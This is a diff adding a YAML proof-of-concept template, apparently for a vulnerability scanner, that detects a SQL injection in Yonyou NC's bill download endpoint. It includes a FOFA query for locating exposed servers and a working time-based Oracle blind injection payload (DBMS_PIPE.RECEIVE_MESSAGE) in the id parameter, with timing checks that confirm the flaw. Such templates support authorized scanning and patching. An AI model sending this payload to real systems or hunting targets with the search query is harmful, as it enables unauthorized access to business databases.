@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-nc-bill-sqli
+info:
+  name: 用友NC bill SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(title,"YONYOU NC")
+- method: GET
+  path: /portal/pt/erfile/down/bill?pageId=login&id=1%27+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{{.t1}})--
+  expression: status_code == 500 && contains(title,"Error") && duration > t1 && duration
+    < t2
+transport: http
